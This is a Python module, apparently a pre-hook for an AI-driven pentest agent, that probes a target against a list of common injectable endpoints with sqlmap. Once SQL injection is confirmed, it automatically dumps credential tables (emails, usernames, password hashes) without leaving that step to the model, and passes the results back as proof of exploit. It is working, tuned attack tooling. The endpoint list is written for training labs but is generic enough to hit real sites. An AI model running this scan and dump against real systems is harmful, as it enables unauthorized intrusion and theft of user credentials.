"""F191 — Multi-endpoint sqlmap discovery hook.

F187 hardcoded ``sqlmap -u {target}/rest/user/login`` which works for
Juice Shop and DVWA-API but misses every other target. F191 expands
that to a curated list of common injectable endpoints. For each one:

1. Send a HEAD request and check the server actually answers (we
   accept any status 2xx-5xx — sqlmap CAN inject through 401/500
   handlers, see F187's --ignore-code=401 trick).
2. If responsive, run a quick sqlmap probe (timeout 30s, technique=B,
   level=2, risk=2).
3. Collect verdicts and emit a markdown table that flags the
   injectable endpoints explicitly so the F186 output-processor
   surfaces them to the model.

Per-target wall-clock budget: 10 endpoints × 30s = 5 min worst-case,
typically ~60-90s because most endpoints fail HEAD or sqlmap exits
on "not injectable" in ~5-8s.
"""

from __future__ import annotations

import logging
import os
import re
import subprocess
import urllib.error
import urllib.request
from typing import Any

logger = logging.getLogger(__name__)

# Deterministic post-confirmation creds dump (scoped). Once an endpoint is
# CONFIRMED injectable, the pwn (extract credentials) must not depend on the
# model choosing to dump — live runs showed the model taking a login-brute
# branch and stuck-looping instead. This scopes the dump to likely credential
# tables/columns so it completes fast (an unscoped --dump of every table times
# out). Gated on KRYON_RED_TEAM: detection is banca-safe, data extraction is not.
_CREDS_TABLES = "Users,users,user,accounts,members,credentials"
_CREDS_COLUMNS = "email,username,user,login,password,passwd,pass,hash,role"
_TRUTHY = {"1", "true", "yes", "on"}
# sqlmap --dump markers that prove data actually came back (not just a probe).
_DUMP_MARKERS = re.compile(r"Database:\s|Table:\s|\[\d+\s+entr(?:y|ies)\]", re.IGNORECASE)

# Flags proven live vs Juice Shop (2026-07-29). The prior BEUST + --threads=5
# combo THRASHED the single-process Node target (curl latency spiked to 232s →
# every sqlmap then timed out at "testing connection", 0 injectable). The fix:
#   - --technique=BU  : boolean/union, NOT error-based. The `q=apple'` → HTTP 500
#     SQLITE_ERROR misled us toward error-based, but `E` returns "not injectable"
#     in 0s; the real injection is boolean-based blind. (BU also covers UNION labs.)
#   - --threads=1     : single-thread. Concurrency is what thrashed the target;
#     serial probing keeps it responsive (post-dump latency stayed 0.01s).
#   - --ignore-code=500,401 : process the 500 body instead of treating it as a
#     connection error (sqlmap skips 500s by default → missed the injection).
#   - --level=3       : level 2 didn't surface the boolean-blind point; 3 did.
# This dumped every Juice Shop user (admin@juice-sh.op + hash) in one pass.
_SQLMAP_BASE_FLAGS = [
    "--batch",
    "--level=3",
    "--risk=2",
    "--threads=1",
    "--timeout=10",
    "--retries=1",
    "--ignore-code=500,401",
    "--technique=BU",
    "--random-agent",
]


def _red_team_enabled() -> bool:
    """Active data extraction is double-gated: the skill only fires under an
    explicit 'active … pentest' keyword AND KRYON_RED_TEAM must be set."""
    return os.environ.get("KRYON_RED_TEAM", "").strip().lower() in _TRUTHY


# Endpoints we've seen SQLi-injectable across the bench universe
# (Juice Shop, DVWA, WebGoat) plus common API auth patterns.
# Each entry is enough metadata for sqlmap to test it:
#   path: relative URL appended to {ctx.target}
#   method: GET or POST
#   data: POST body (JSON or form-encoded)
#   content_type: HTTP header (POST only)
KNOWN_INJECTABLE_ENDPOINTS: list[dict[str, str]] = [
    # Juice Shop's well-known SQLi (REST login, JSON body)
    {
        "path": "/rest/user/login",
        "method": "POST",
        "data": '{"email":"test","password":"test"}',
        "content_type": "application/json",
    },
    # Common API auth variants
    {
        "path": "/api/v1/auth/login",
        "method": "POST",
        "data": '{"username":"test","password":"test"}',
        "content_type": "application/json",
    },
    {
        "path": "/api/login",
        "method": "POST",
        "data": '{"username":"test","password":"test"}',
        "content_type": "application/json",
    },
    # GET search endpoints with q= parameter
    {
        "path": "/rest/products/search?q=apple",
        "method": "GET",
    },
    {
        "path": "/search?q=apple",
        "method": "GET",
    },
    {
        "path": "/api/products?q=apple",
        "method": "GET",
    },
    # Numeric ID endpoints (common IDOR + SQLi)
    {
        "path": "/api/users/1",
        "method": "GET",
    },
    {
        "path": "/api/Users/1",
        "method": "GET",
    },
    {
        "path": "/api/products/1",
        "method": "GET",
    },
    # DVWA-style form-encoded login
    {
        "path": "/login.php",
        "method": "POST",
        "data": "username=admin&password=admin",
        "content_type": "application/x-www-form-urlencoded",
    },
    # F203.AM — PortSwigger Web Security Academy lab patterns.
    # Filter/category/product GET endpoints (classic SQLi via query string).
    # These match the canonical PortSwigger SQLi labs:
    #   - /web-security/sql-injection/lab-retrieve-hidden-data → ?category=Gifts
    #   - /web-security/sql-injection/lab-login-bypass         → /login POST
    #   - /web-security/sql-injection/lab-where-clause         → ?category=*
    {
        "path": "/filter?category=Gifts",
        "method": "GET",
    },
    {
        "path": "/filter?category=Pets",
        "method": "GET",
    },
    {
        "path": "/product?productId=1",
        "method": "GET",
    },
    # OS command injection labs (productId+storeId POST)
    {
        "path": "/product/stock",
        "method": "POST",
        "data": "productId=1&storeId=1",
        "content_type": "application/x-www-form-urlencoded",
    },
    # Classic SQL injection via GET param "id" (DVWA, WebGoat, generic)
    {
        "path": "/?id=1",
        "method": "GET",
    },
    {
        "path": "/items?id=1",
        "method": "GET",
    },
    {
        "path": "/vulnerabilities/sqli/?id=1&Submit=Submit",
        "method": "GET",
    },
    # WebGoat A03 injection
    {
        "path": "/WebGoat/SqlInjection/attack5a?login_count=1&userid=1",
        "method": "GET",
    },
]


# Status codes that indicate "the server answered — worth probing".
# We accept 2xx-5xx; only network failures (0) are filtered out.
def _is_responsive(status_code: int | None) -> bool:
    if status_code is None:
        return False
    return 200 <= status_code <= 599


_POSITIVE_PATTERNS = re.compile(
    r"sqlmap identified the following injection|is vulnerable|"
    r"injection point\(s\)",
    re.IGNORECASE,
)


def _looks_injection_positive(sqlmap_out: str | None) -> bool:
    if not sqlmap_out or not isinstance(sqlmap_out, str):
        return False
    return bool(_POSITIVE_PATTERNS.search(sqlmap_out))


def _probe_responsive(url: str, *, timeout: int = 5) -> int:
    """HEAD request; fall back to GET when the server rejects HEAD.
    Returns the HTTP status code, or 0 on network failure."""
    for method in ("HEAD", "GET"):
        try:
            req = urllib.request.Request(
                url,
                method=method,
                headers={"User-Agent": "Kryon-F191-probe/1.0"},
            )
            with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310
                return resp.status
        except urllib.error.HTTPError as exc:
            return exc.code
        except (urllib.error.URLError, OSError, TimeoutError):
            continue
    return 0


def _run_sqlmap_quick(endpoint: dict, target: str, *, timeout: int = 30) -> str:
    """Run sqlmap once against one endpoint. Returns the stdout/stderr
    captured as a single string. Empty target → empty string."""
    if not target:
        return ""
    url = f"{target}{endpoint['path']}"
    cmd = ["sqlmap", "-u", url, *_SQLMAP_BASE_FLAGS]
    if endpoint.get("method") == "POST":
        if "data" in endpoint:
            cmd.extend(["--data", endpoint["data"]])
        if endpoint.get("content_type"):
            cmd.extend(["--headers", f"Content-Type: {endpoint['content_type']}"])
    logger.info("F191 sqlmap on %s", url)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=False)
    except subprocess.TimeoutExpired:
        return f"[timeout after {timeout}s]"
    except FileNotFoundError:
        return "[sqlmap not installed]"
    except OSError as exc:
        return f"[os error: {exc}]"
    out = result.stdout or result.stderr or ""
    return out[:6000]


def _summarize_endpoint_results(results: list[dict]) -> str:
    """Render per-endpoint outcome as a compact markdown block.

    Positive (injectable) endpoints are flagged with **VULNERABLE**
    so the F186 imperative suffix lands the right finding in the
    JSON array.
    """
    if not results:
        return (
            "[F191] no endpoints reachable on target — sqlmap probe skipped.\n"
            "Targets that don't expose login/search/users APIs return no results."
        )

    positive = [r for r in results if r.get("injectable")]
    negative = [r for r in results if not r.get("injectable")]
    lines = [
        f"[F191] endpoints probed: {len(results)} | VULNERABLE: {len(positive)} | clean: {len(negative)}",
        "",
    ]
    for r in positive:
        lines.append(f"**VULNERABLE** {r['method']} {r['endpoint']} (status {r['status']})")
        # Trim sqlmap_summary aggressively — only the diagnostic lines
        # the model needs to emit a CWE-89 finding.
        for sline in (r.get("sqlmap_summary") or "").splitlines():
            sline = sline.strip()
            if not sline:
                continue
            if any(
                k in sline.lower()
                for k in (
                    "injection point",
                    "parameter:",
                    "type:",
                    "title:",
                    "payload:",
                    "back-end dbms",
                )
            ):
                lines.append(f"  {sline}")
        lines.append("")
    if negative:
        lines.append("Endpoints tested + not vulnerable:")
        for r in negative:
            lines.append(f"  - {r['method']} {r['endpoint']} (status {r['status']})")
    return "\n".join(lines)


def _run_sqlmap_dump(endpoint: dict, target: str, *, timeout: int = 300) -> str:
    """Scoped credential dump against a CONFIRMED-injectable endpoint.

    Read-only SELECT scoped to likely creds tables/columns (``-T``/``-C``) so it
    completes — an unscoped ``--dump`` of every table times out before reaching
    the creds (observed live vs Juice Shop). ``timeout`` is generous because a
    boolean/error-based dump is slow; the caller gates this on KRYON_RED_TEAM."""
    if not target:
        return ""
    url = f"{target}{endpoint['path']}"
    cmd = [
        "sqlmap",
        "-u",
        url,
        *_SQLMAP_BASE_FLAGS,
        "-T",
        _CREDS_TABLES,
        "-C",
        _CREDS_COLUMNS,
        "--dump",
        "--exclude-sysdbs",
        # single-thread boolean-blind extracts ~1 row / 20s; --stop caps the dump
        # to the first rows (admin is near the top) so it proves pwn without
        # running past the pre_hook budget on a large table.
        "--stop=8",
        # Fresh retrieval every call: a prior attempt that failed to dump a table
        # caches "unable to retrieve" in the session, and a resumed run returns
        # that stale failure in ~2s instead of re-dumping. (Observed live.)
        "--flush-session",
    ]
    if endpoint.get("method") == "POST":
        if "data" in endpoint:
            cmd.extend(["--data", endpoint["data"]])
        if endpoint.get("content_type"):
            cmd.extend(["--headers", f"Content-Type: {endpoint['content_type']}"])
    logger.info("F191+ scoped creds dump on %s", url)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=False)
    except subprocess.TimeoutExpired:
        return f"[dump timeout after {timeout}s]"
    except FileNotFoundError:
        return "[sqlmap not installed]"
    except OSError as exc:
        return f"[os error: {exc}]"
    return (result.stdout or result.stderr or "")[:8000]


def _extract_dump_block(dump_out: str) -> str:
    """Return the dumped-data section of sqlmap ``--dump`` output when real rows
    came back, else "". Keys off the ``Database:``/``Table:``/``[N entries]``
    markers sqlmap prints above each table so we only surface an actual dump —
    a probe that found nothing to extract returns "" (no false pwn claim)."""
    if not dump_out or not isinstance(dump_out, str):
        return ""
    marker = _DUMP_MARKERS.search(dump_out)
    if not marker:
        return ""
    block = dump_out[marker.start() :].strip()
    return block[:4000]


# Max endpoints to attempt a dump on before giving up. A GET query-param
# injection (SELECT … WHERE q=<inj>) dumps a creds table cleanly; a login
# WHERE-clause injection (SELECT * FROM Users WHERE email=<inj>) confirms
# vulnerable but often can't run the dump subquery ("unable to retrieve … table
# 'Users'"), so we try more than one — GET vectors first.
_MAX_DUMP_ATTEMPTS = 3

# Canonical GET query-param endpoints that dump cleanly across the bench universe.
# Attempted even when the responsive pre-probe skipped them: that probe flaky-skips
# the very endpoint that dumps best (Juice Shop's /rest/products/search 500s/hangs
# on the HEAD probe intermittently), and sqlmap self-detects, so a probe miss must
# not cost the pwn. Only tried once SQLi is confirmed SOMEWHERE on the target.
_CANONICAL_DUMP_PATHS = (
    "/rest/products/search?q=apple",  # Juice Shop
    "/filter?category=Gifts",  # PortSwigger labs
    "/product?productId=1",
    "/?id=1",  # DVWA / generic
    "/items?id=1",
)


def _endpoint_by_path(path: str) -> dict | None:
    return next((e for e in KNOWN_INJECTABLE_ENDPOINTS if e.get("path") == path), None)


def _dump_candidate_paths(results: list[dict]) -> list[str]:
    """Endpoint paths to attempt a scoped dump on, best-first and deduped:
    (1) F191-flagged injectable GET query-param endpoints, (2) canonical GET dump
    vectors even if the probe skipped them, (3) flagged injectable non-GET (login
    confirms but often can't dump). Capped to bound wall-clock."""
    order: list[str] = []

    def add(p: str | None) -> None:
        if p and p not in order:
            order.append(p)

    for r in results:
        p = r.get("endpoint") or ""
        if r.get("injectable") and r.get("method") == "GET" and "?" in p:
            add(p)
    for p in _CANONICAL_DUMP_PATHS:
        add(p)
    for r in results:
        if r.get("injectable"):
            add(r.get("endpoint"))
    return order[:_MAX_DUMP_ATTEMPTS]


def _maybe_dump_creds(results: list[dict], target: str) -> str:
    """Deterministic pwn step: once SQLi is confirmed anywhere on the target, run a
    scoped creds dump on the best vectors (GET-param first), stopping at the first
    that yields rows. Returns a markdown block, or "" when no dump ran / nothing
    extracted (not red-team, no injectable endpoint, or every attempt came back
    empty — no false pwn claim)."""
    if not _red_team_enabled():
        return ""
    if not any(r.get("injectable") for r in results):
        return ""  # no SQLi confirmed anywhere → don't blind-dump non-vulnerable targets
    for path in _dump_candidate_paths(results):
        endpoint = _endpoint_by_path(path)
        if endpoint is None:
            continue
        block = _extract_dump_block(_run_sqlmap_dump(endpoint, target))
        if block:
            return (
                f"\n\n[F191+] **CREDS DUMPED (deterministic, scoped) — {endpoint['method']} {path}**\n"
                "Ground truth extracted by sqlmap after confirming the injection — this is proof-of-exploit, "
                "not a hypothesis. Report it as a CWE-89 impact (db_takeover / account_takeover):\n"
                f"```\n{block}\n```"
            )
    return ""


def run(ctx: dict[str, Any]) -> str:
    """Pre-hook entrypoint: discover + probe + summarize."""
    target = (ctx.get("target") or "").strip().rstrip("/")
    if not target:
        return "[F191] no target provided in ctx"

    # F203.AK.C — build_turn_ctx.target may come without a URL scheme
    # (e.g. "portswigger.net/path" extracted from prompt). sqlmap and
    # urllib both reject schemeless URLs. Default to https:// if no
    # scheme, since active pentest skills should never use plain HTTP.
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    results: list[dict] = []
    for endpoint in KNOWN_INJECTABLE_ENDPOINTS:
        url = f"{target}{endpoint['path']}"
        # Probe the FULL url (query included) — the base path can behave
        # differently: e.g. Juice Shop's /rest/products/search 500s / hangs on
        # HEAD without ?q=, so stripping the query intermittently marked the
        # actual injectable endpoint non-responsive and skipped it. GET on the
        # full url returns 200 reliably.
        status = _probe_responsive(url)
        if not _is_responsive(status):
            logger.debug("F191 skip %s (status=%s)", url, status)
            continue
        sqlmap_out = _run_sqlmap_quick(endpoint, target)
        results.append(
            {
                "endpoint": endpoint["path"],
                "method": endpoint["method"],
                "status": status,
                "sqlmap_summary": sqlmap_out,
                "injectable": _looks_injection_positive(sqlmap_out),
            }
        )

    return _summarize_endpoint_results(results) + _maybe_dump_creds(results, target)
